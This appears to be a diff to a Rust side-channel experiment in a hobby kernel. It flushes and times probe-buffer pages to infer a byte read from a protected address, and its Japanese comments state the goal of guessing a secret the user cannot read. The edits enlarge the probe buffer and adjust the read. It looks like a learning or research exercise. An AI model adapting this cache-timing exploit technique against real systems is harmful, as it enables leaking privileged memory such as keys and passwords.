@@ -15,7 +15,7 @@ unsafe fn flush(addr: *const u8) {
 
 #[inline(always)]
 unsafe fn flush_buffer(buffer: *const u8) {
-    for i in 0..4 {
+    for i in 0..65 {
         flush(buffer.add(i * PAGE_SIZE));
     }
 }
@@ -48,7 +48,7 @@ unsafe fn guess_bit_once(seed: u8, buffer: *mut u8) -> u8 {
     // 飛び先のアドレスで予測されている（CPUは）
     // それを参考にしてトレーニングを施してみる（アドレスの一部を使っている）
 
-    let p = 0x80000000 as *mut u64;
+    let p = 0x80000000 as *mut u8;
     //buffer.add(1).write_volatile(1);
     buffer.add(
         (*p as usize + 1) * PAGE_SIZE
@@ -62,7 +62,7 @@ unsafe fn guess_bit_once(seed: u8, buffer: *mut u8) -> u8 {
     // ここに飛びたい
     (0..64)
         .min_by_key(|i| {
-            let time = probe(buffer.add((i + 1 )* PAGE_SIZE));
+            let time = probe(buffer.add((i+1) * PAGE_SIZE));
             //serial_println!("{}: {}", i, time);
             time
         })
@@ -107,9 +107,9 @@ pub extern "C" fn cache(sample: u8) {
     // セグメントレジスタとかを表示できるようにする（デバッグ情報を出力）
     // 権限が切り替わったらいいね
     // 最終的には、秘密の値のあるアドレスを渡して（そのアドレスはユーザから読めないようにする）推測できればOK
-    let mut buffer = [0u8; PAGE_SIZE * 4];
+    let mut buffer = [0u8; PAGE_SIZE * 70];
     let result = unsafe { guess_bit(sample, buffer.as_mut_ptr()) };
-    serial_println!("result: {:x}", result);
+    serial_println!("result: {}", result);
 
     /*for i in 0..64 {
         unsafe {
